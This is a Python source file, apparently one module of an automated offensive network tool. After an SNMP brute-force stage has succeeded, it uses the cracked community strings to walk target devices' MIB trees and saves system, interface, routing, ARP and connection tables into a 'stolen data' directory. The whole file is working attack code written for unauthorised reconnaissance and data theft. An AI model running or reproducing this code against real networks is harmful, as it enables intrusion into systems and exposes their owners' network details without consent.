"""
steal_data_snmp.py - Walks SNMP MIB trees (system info, interfaces, ARP table,
routing, TCP/UDP connections) using known community strings and dumps results to CSV.
Requires the snmp-utils package (snmpwalk command).
"""

import os
import subprocess
import logging
import time
import pandas as pd
from shared import SharedData
from logger import Logger

logger = Logger(name="steal_data_snmp.py", level=logging.DEBUG)

b_class = "StealDataSNMP"
b_module = "steal_data_snmp"
b_status = "steal_data_snmp"
b_parent = "SNMPBruteforce"
b_port = 161

OID_TARGETS = {
    "system":     "1.3.6.1.2.1.1",
    "interfaces": "1.3.6.1.2.1.2",
    "ip_routing": "1.3.6.1.2.1.4",
    "arp_table":  "1.3.6.1.2.1.4.22",
    "tcp_conns":  "1.3.6.1.2.1.6",
    "udp_conns":  "1.3.6.1.2.1.7",
}


class StealDataSNMP:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.b_parent_action = b_parent
        self.stop_execution = False
        logger.info("StealDataSNMP initialized.")

    def snmpwalk(self, ip, community, oid, timeout=60):
        """Walk an OID subtree and return (oid_path, value) rows."""
        try:
            result = subprocess.run(
                ["snmpwalk", "-v1", "-c", community, "-t", "5", "-r", "0", ip, oid],
                capture_output=True, text=True, timeout=timeout
            )
            if result.returncode != 0:
                return []
            rows = []
            for line in result.stdout.strip().splitlines():
                parts = line.split(" = ", 1)
                if len(parts) == 2:
                    rows.append({"OID": parts[0].strip(), "Value": parts[1].strip()})
            return rows
        except FileNotFoundError:
            logger.warning("snmpwalk not found — install snmp-utils: apt-get install snmp")
            return []
        except subprocess.TimeoutExpired:
            logger.warning(f"snmpwalk timed out for {ip} OID {oid}")
            return []
        except Exception as e:
            logger.error(f"snmpwalk error for {ip}: {e}")
            return []

    def execute(self, ip, port, row, status_key):
        try:
            parent_status = row.get(self.b_parent_action, "")
            if 'success' not in parent_status:
                logger.info(f"Skipping SNMP dump for {ip} — parent not successful")
                return 'skipped'

            self.shared_data.ragnarorch_status = "StealDataSNMP"
            time.sleep(2)
            logger.info(f"Dumping SNMP MIB data from {ip}:{port}...")

            snmpfile = self.shared_data.snmpfile
            communities = []
            if os.path.exists(snmpfile):
                df = pd.read_csv(snmpfile)
                ip_rows = df[df['IP Address'] == ip]
                communities = ip_rows['Community'].tolist()

            if not communities:
                logger.error(f"No SNMP community strings found for {ip}")
                return 'failed'

            mac = row.get('MAC Address', 'unknown')
            local_dir = os.path.join(self.shared_data.datastolendir, f"snmp/{mac}_{ip}")
            os.makedirs(local_dir, exist_ok=True)

            success = False
            for community in communities:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    break
                total_rows = 0
                for oid_name, oid in OID_TARGETS.items():
                    if self.shared_data.orchestrator_should_exit:
                        break
                    rows = self.snmpwalk(ip, community, oid)
                    if rows:
                        out_path = os.path.join(local_dir, f"{oid_name}.csv")
                        pd.DataFrame(rows).to_csv(out_path, index=False)
                        total_rows += len(rows)
                        logger.info(f"Saved {len(rows)} rows for {oid_name} from {ip}")
                if total_rows > 0:
                    logger.success(f"SNMP dump complete for {ip}: {total_rows} total entries")
                    success = True
                    break

            return 'success' if success else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during SNMP dump for {ip}: {e}")
            return 'failed'


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal = StealDataSNMP(shared_data)
        for row in shared_data.read_data():
            ip = row["IPs"]
            steal.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
